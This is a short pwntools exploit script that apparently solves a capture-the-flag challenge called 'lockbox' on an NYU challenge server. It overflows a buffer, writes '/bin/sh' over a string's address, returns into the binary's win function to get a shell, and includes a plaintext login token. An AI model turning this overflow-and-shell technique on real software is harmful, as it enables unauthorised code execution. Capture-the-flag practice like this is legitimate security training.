from pwn import *

context.log_level = "INFO"
context.terminal = ["tmux", "splitw", "-f", "-h"]
target_file = "./lockbox"

LOCAL = False

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    continue
    ''')
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1282)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")

e = ELF(target_file, checksec=False)
target_addr = e.symbols.my_string
win_addr = e.symbols.win
shell_code = int.from_bytes('/bin/sh'.encode(), byteorder='little')
print(f'Target address: {hex(target_addr)}')
print(f'Win address: {hex(win_addr)}')
print(f'Shell code: {hex(shell_code)}')
p.recvuntil(b"> ")
a = asm("""
        endbr64;
        push rbp
    """, arch='amd64',os='linux')
p.sendline((b'B' * 0x10) + p64(target_addr) + p64(shell_code) + (b'A' * 0x28) + p64(win_addr + len(a)))
p.interactive()
